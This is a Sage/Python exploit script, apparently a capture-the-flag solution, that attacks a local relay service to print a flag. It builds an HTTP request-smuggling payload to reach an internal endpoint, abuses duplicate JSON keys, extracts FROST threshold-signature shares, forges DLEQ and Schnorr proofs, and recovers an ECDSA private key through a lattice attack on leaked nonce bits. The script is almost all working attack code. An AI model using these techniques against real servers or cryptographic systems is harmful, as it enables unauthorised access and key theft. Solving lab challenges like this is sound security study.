#!/usr/bin/env sage
import json, hashlib, struct, base64, socket, time, sys

H = "127.0.0.1"
P = 8080
B = "test"
L = 40
M = 136
SFT = 176
TOP = 12

p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
E = EllipticCurve(GF(p), [0, 7])
G = E(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
      0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

def pb(pt):
    x, y = int(pt[0]), int(pt[1])
    return bytes([0x03 if y & 1 else 0x02]) + x.to_bytes(32, "big")

def pf(h):
    b = bytes.fromhex(h)
    for pt in E.lift_x(Integer(int.from_bytes(b[1:], "big")), all=True):
        if (int(pt[1]) & 1) == (b[0] & 1):
            return pt
    raise RuntimeError("point from hex failed")

def hs(d, *a):
    hh = hashlib.sha256()
    hh.update(d.encode() if isinstance(d, str) else d)
    for x in a:
        if isinstance(x, Integer):
            x = int(x)
        v = bytes([x]) if isinstance(x, int) else (x.encode() if isinstance(x, str) else bytes(x))
        hh.update(struct.pack(">I", len(v)))
        hh.update(v)
    return int(hh.hexdigest(), 16) % n

def H256(*a):
    h = hashlib.sha256()
    for x in a:
        h.update(x.encode() if isinstance(x, str) else x)
    return h.digest()

def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * ((4 - len(s) % 4) % 4))

def http_req(meth, path, hdrs=None, body=None):
    hd = dict(hdrs or {})
    b = body.encode() if isinstance(body, str) else (body or b"")
    if b:
        hd["Content-Length"] = str(len(b))
    raw = (f"{meth} {path} HTTP/1.1\r\nHost: {H}:{P}\r\n" +
           "".join(f"{k}: {v}\r\n" for k, v in hd.items()) + "\r\n").encode() + b
    s = socket.create_connection((H, P))
    s.settimeout(10)
    s.sendall(raw)
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d:
            break
        buf += d
    parts = buf.split(b"\r\n\r\n", 1)
    if len(parts) < 2:
        s.close()
        return None
    hdr, rest = parts
    status = int(hdr.split(b" ")[1])
    cl = 0
    for ln in hdr.decode("latin1").split("\r\n"):
        if ln.lower().startswith("content-length:"):
            cl = int(ln.split(":", 1)[1].strip())
    while len(rest) < cl:
        d = s.recv(4096)
        if not d:
            break
        rest += d
    s.close()
    return status, rest[:cl]

def api(meth, path, hdrs=None, js=None, raw_body=None):
    if raw_body is not None:
        b = raw_body.encode() if isinstance(raw_body, str) else raw_body
    elif js is not None:
        b = json.dumps(js).encode()
    else:
        b = None
    hd2 = dict(hdrs or {})
    if b:
        hd2["Content-Type"] = "application/json"
    res = http_req(meth, path, hd2, b)
    if res is None:
        raise RuntimeError(f"empty response from {meth} {path}")
    status, body = res
    if status != 200:
        raise RuntimeError(f"HTTP {status} from {meth} {path}: {body[:200]}")
    return json.loads(body.decode())

def hnp(vault, cnt):
    I = inverse_mod(Integer(2 ** L), n)
    a, bv = [], []
    for rec in vault["records"][:cnt]:
        rv, sv = Integer(rec["r"]), Integer(rec["s"])
        mv = hs("relay/ecdsa/message/v1", rec["message"])
        up = int.from_bytes(b64d(rec["trace"]["carry"]), "little")
        lo = int.from_bytes(b64d(rec["trace"]["spill"]), "little")
        A = (up << SFT) | lo
        inv_s = inverse_mod(sv, n)
        a.append((inv_s * rv * I) % n)
        bv.append(((inv_s * mv - A) * I - 2 ** (M - 1)) % n)
    d = len(a)
    SC = 2 ** 121
    X = matrix(ZZ, d + 2, d + 2)
    for i in range(d):
        X[i, i] = n * SC
        X[d, i] = int(a[i]) * SC
        X[d + 1, i] = int(bv[i]) * SC
    X[d, d] = 1
    X[d + 1, d + 1] = 2 ** (M - 1)
    for row in X.LLL():
        if abs(row[-1]) == 2 ** (M - 1):
            x = Integer(row[d]) if row[-1] > 0 else Integer(-row[d])
            if G * int(x) == pf(vault["recoveryPublic"]):
                return x
    return None

sys.stderr.write("[*] smuggle lease\n")
sys.stderr.flush()

smug = "GET /internal/lease HTTP/1.1\r\nHost: x\r\n\r\n"
c0 = f"0\r\n\r\n{smug}"
payload = (f"POST /api/ping HTTP/1.1\r\nHost: {H}:{P}\r\n"
           f"Transfer-Encoding: chunked\r\nContent-Length: {len(c0)}\r\n\r\n{c0}"
           "GET /api/ping HTTP/1.1\r\nHost: x\r\n\r\n").encode()

sock = socket.create_connection((H, P))
sock.settimeout(10)
sock.sendall(payload)

buf = b""
bodies = []
deadline = time.time() + 8
while time.time() < deadline:
    try:
        d = sock.recv(4096)
    except:
        break
    if not d:
        break
    buf += d
    while True:
        i = buf.find(b"\r\n\r\n")
        if i < 0:
            break
        hdr = buf[:i]
        cl = 0
        for ln in hdr.decode("latin1").split("\r\n"):
            if ln.lower().startswith("content-length:"):
                cl = int(ln.split(":", 1)[1].strip())
        if len(buf) < i + 4 + cl:
            break
        bodies.append(buf[i + 4 : i + 4 + cl])
        buf = buf[i + 4 + cl:]
sock.close()

lease_body = None
for body in bodies:
    try:
        obj = json.loads(body)
        if "lease" in obj:
            lease_body = obj
            break
    except:
        pass

if lease_body is None:
    sys.stderr.write("[-] smuggling failed\n")
    sys.exit(1)

lease = lease_body["lease"]
sys.stderr.write(f"[+] lease = {lease}\n")
sys.stderr.flush()

BK = "deadbeefcafe1234"
api("GET", f"/assets/policy.mjs?bucket={BK}", hdrs={"X-Relay-Mode": "frost-trace"})

sys.stderr.write("[*] fetch frost artifact\n")
sys.stderr.flush()
frost = api("POST", f"/api/relay?bucket={BK}",
            raw_body='{"operation":"audit","operation":"frost-trace","lease":"%s"}' % lease)
sys.stderr.write("[+] frost artifact retrieved\n")
sys.stderr.flush()

gb = bytes.fromhex(frost["groupPublic"])
ce = b""
for p in frost["participants"]:
    ce += bytes([p["id"]]) + bytes.fromhex(p["hiding"]) + bytes.fromhex(p["binding"])

share1 = None
share2 = None
for pid, lm_val in [(1, 2), (2, n - 1)]:
    z = [Integer(s["partials"][pid - 1]["response"]) for s in frost["sessions"]]
    cv = [hs("relay/frost/challenge/v1", bytes.fromhex(s["commitment"]), gb, s["message"]) for s in frost["sessions"]]
    fv = [hs(B, gb, ce, s["message"], pid) for s in frost["sessions"]]

    a11 = (fv[1] - fv[0]) % n
    a12 = (lm_val * (cv[1] - cv[0])) % n
    b1  = (z[1] - z[0]) % n
    a21 = (fv[2] - fv[0]) % n
    a22 = (lm_val * (cv[2] - cv[0])) % n
    b2  = (z[2] - z[0]) % n

    det = (a21 * a12 - a11 * a22) % n
    rhs = (a21 * b1 - a11 * b2) % n
    si  = (rhs * inverse_mod(Integer(det), n)) % n

    if pid == 1:
        share1 = si
    else:
        share2 = si

root = (2 * share1 - share2) % n
assert G * int(root) == pf(frost["groupPublic"])
sys.stderr.write(f"[+] rootSecret recovered\n")
sys.stderr.flush()

sys.stderr.write("[*] solve DLEQ\n")
sys.stderr.flush()
att = api("GET", "/api/attestation")
k = Integer(randint(1, n - 1))
CG = G * int(k)
CH = pf(att["baseH"]) * int(k)
ch = hs("relay/dleq/v1", pb(G), pb(pf(att["baseH"])), pb(pf(frost["groupPublic"])),
        pb(pf(att["relationPoint"])), pb(CG), pb(CH), att["nonce"])
vault = api("POST", "/api/vault", js={
    "nonce": att["nonce"], "commitmentG": pb(CG).hex(), "commitmentH": pb(CH).hex(),
    "response": str((k + ch * root) % n)})
sys.stderr.write("[+] vault unlocked\n")
sys.stderr.flush()

sys.stderr.write(f"[*] HNP lattice attack ({len(vault['records'])} sigs)\n")
sys.stderr.flush()
sec = hnp(vault, TOP)
if sec is None:
    for cnt in range(4, len(vault["records"]) + 1):
        sec = hnp(vault, cnt)
        if sec:
            break
if sec is None:
    sys.stderr.write("[-] HNP failed\n")
    sys.exit(1)
sys.stderr.write("[+] recoverySecret found\n")
sys.stderr.flush()

ec = vault["ecies"]
shared = pf(ec["ephemeralPublic"]) * int(sec)
key = H256("relay/ecies/aes-gcm/v1", pb(shared))
from Crypto.Cipher import AES
pt = AES.new(key, AES.MODE_GCM, nonce=b64d(ec["iv"])).decrypt_and_verify(
    b64d(ec["ciphertext"]), b64d(ec["tag"]))
inner = json.loads(pt.decode())
rs_sec = int.from_bytes(bytes.fromhex(inner["delegationScalar"]), "big")
ticket = inner["ticket"]
sys.stderr.write("[+] ECIES decrypted\n")
sys.stderr.flush()

sys.stderr.write("[*] forge Schnorr release\n")
sys.stderr.flush()
red = api("GET", "/api/redemption")
k2 = Integer(randint(1, n - 1))
R2 = G * int(k2)
msg = f"nonce={red['nonce']}\nticket={ticket}"
ch2 = hs("relay/release-schnorr/v1", pb(R2), pb(pf(red["releasePublic"])), msg)
flag = api("POST", "/api/redeem", js={
    "nonce": red["nonce"], "ticket": ticket, "commitment": pb(R2).hex(),
    "response": str((k2 + ch2 * rs_sec) % n)})
print(flag["flag"])
